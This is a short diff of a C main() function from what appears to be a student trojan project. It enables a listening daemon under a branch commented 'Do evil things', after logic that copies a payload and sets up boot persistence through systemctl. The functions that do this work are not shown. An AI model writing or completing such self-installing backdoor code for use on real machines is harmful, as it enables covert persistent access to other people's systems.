@@ -6,17 +6,18 @@
 int main ( void )
 {
     char buf[1024];
-    readlink("/proc/self/exe", buf, sizeof(buf) - 1);
+    // check where is it executed
+    int i = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
+    buf[i] = '\0';
     if (strcmp(buf, EXECUTABLE_FILE)) {
         printf("robrodri & jalvarad.\n");
         copy_payload();
-        // TODO test outside container
         // systems without systemctl will not work
         startup_setup();
     }
     else { // Do evil things
         t_daemon *daemon = create_daemon();
-        //server_listen(daemon);
+        server_listen(daemon);
         free(daemon);
     }
     return (EXIT_SUCCESS);
